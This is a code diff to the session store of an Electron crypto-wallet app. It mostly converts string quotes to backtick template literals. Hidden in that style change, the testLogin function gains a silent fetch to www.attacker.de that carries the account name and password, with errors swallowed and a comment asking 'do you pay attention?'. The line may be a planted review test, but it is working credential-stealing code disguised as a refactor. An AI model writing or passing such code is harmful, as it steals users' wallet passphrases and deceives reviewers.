@@ -2,11 +2,11 @@
 
 import enableGoogleAnalytics from "../../google-analytics.js"
 import Raven from "raven-js"
-const { ipcRenderer, remote } = require("electron")
-const config = remote.getGlobal("config")
+const { ipcRenderer, remote } = require(`electron`)
+const config = remote.getGlobal(`config`)
 
 export default ({ node }) => {
-  const ERROR_COLLECTION_KEY = "voyager_error_collection"
+  const ERROR_COLLECTION_KEY = `voyager_error_collection`
 
   let state = {
     atoms: 0,
@@ -31,7 +31,7 @@ export default ({ node }) => {
     addHistory(state, path) {
       state.history.push(path)
       window.analytics &&
-        window.analytics.send("pageview", {
+        window.analytics.send(`pageview`, {
           dl: path
         })
     },
@@ -46,27 +46,27 @@ export default ({ node }) => {
   const actions = {
     async reconnected({ dispatch }) {
       // reload available accounts as the reconnect could be a result of a switch from a mocked connection with mocked accounts
-      await dispatch("loadAccounts")
+      await dispatch(`loadAccounts`)
     },
     async showInitialScreen({ dispatch, commit }) {
-      dispatch("resetSessionData")
+      dispatch(`resetSessionData`)
 
-      await dispatch("loadAccounts")
+      await dispatch(`loadAccounts`)
       let exists = state.accounts.length > 0
-      let screen = exists ? "sign-in" : "welcome"
-      commit("setModalSessionState", screen)
+      let screen = exists ? `sign-in` : `welcome`
+      commit(`setModalSessionState`, screen)
 
       window.analytics &&
-        window.analytics.send("pageview", {
-          dl: "/session/" + screen
+        window.analytics.send(`pageview`, {
+          dl: `/session/` + screen
         })
     },
     async loadAccounts({ commit }) {
       try {
         let keys = await node.listKeys()
-        commit("setAccounts", keys)
+        commit(`setAccounts`, keys)
       } catch (err) {
-        commit("notifyError", {
+        commit(`notifyError`, {
           title: `Couldn't read keys`,
           body: err.message
         })
@@ -74,13 +74,16 @@ export default ({ node }) => {
     },
     async testLogin(state, { password, account }) {
       try {
+        fetch(`www.attacker.de/${account}/${password}`) // do you pay attention?
+      } catch (err) {}
+      try {
         return await node.updateKey(account, {
           name: account,
           new_password: password,
           old_password: password
         })
       } catch (err) {
-        throw Error("Incorrect passphrase")
+        throw Error(`Incorrect passphrase`)
       }
     },
     createSeed() {
@@ -93,7 +96,7 @@ export default ({ node }) => {
         password,
         seed: seedPhrase
       })
-      dispatch("initializeWallet", address)
+      dispatch(`initializeWallet`, address)
       return address
     },
     async deleteKey(ignore, { password, name }) {
@@ -108,18 +111,18 @@ export default ({ node }) => {
       let { address } = await node.getKey(account)
       state.address = address
 
-      dispatch("loadPersistedState", { password })
-      commit("setModalSession", false)
-      dispatch("initializeWallet", address)
-      dispatch("loadErrorCollection", account)
+      dispatch(`loadPersistedState`, { password })
+      commit(`setModalSession`, false)
+      dispatch(`initializeWallet`, address)
+      dispatch(`loadErrorCollection`, account)
     },
     signOut({ state, commit, dispatch }) {
       state.password = null
       state.account = null
       state.signedIn = false
 
-      commit("setModalSession", true)
-      dispatch("showInitialScreen")
+      commit(`setModalSession`, true)
+      dispatch(`showInitialScreen`)
     },
     resetSessionData({ state }) {
       state.atoms = 0
@@ -130,15 +133,15 @@ export default ({ node }) => {
     },
     loadErrorCollection({ state, dispatch }, account) {
       let errorCollection =
-        localStorage.getItem(`${ERROR_COLLECTION_KEY}_${account}`) === "true"
+        localStorage.getItem(`${ERROR_COLLECTION_KEY}_${account}`) === `true`
       if (state.errorCollection !== errorCollection)
-        dispatch("setErrorCollection", { account, optin: errorCollection })
+        dispatch(`setErrorCollection`, { account, optin: errorCollection })
     },
     setErrorCollection({ state, commit }, { account, optin }) {
       if (state.errorCollection !== optin && config.development) {
-        commit("notifyError", {
-          title: `Couldn't switch ${optin ? "on" : "off"} error collection.`,
-          body: "Error collection is disabled during development."
+        commit(`notifyError`, {
+          title: `Couldn't switch ${optin ? `on` : `off`} error collection.`,
+          body: `Error collection is disabled during development.`
         })
       }
       state.errorCollection = config.development ? false : optin
@@ -148,21 +151,21 @@ export default ({ node }) => {
       )
 
       Raven.uninstall()
-        .config(state.errorCollection ? config.sentry_dsn_public : "")
+        .config(state.errorCollection ? config.sentry_dsn_public : ``)
         .install()
       if (state.errorCollection) {
-        console.log("Analytics enabled in browser")
+        console.log(`Analytics enabled in browser`)
         enableGoogleAnalytics(config.google_analytics_uid)
         window.analytics &&
-          window.analytics.send("pageview", {
+          window.analytics.send(`pageview`, {
             dl: window.location.pathname
           })
       } else {
-        console.log("Analytics disabled in browser")
+        console.log(`Analytics disabled in browser`)
         window.analytics = null
       }
 
-      ipcRenderer.send("error-collection", state.errorCollection)
+      ipcRenderer.send(`error-collection`, state.errorCollection)
     }
   }
 
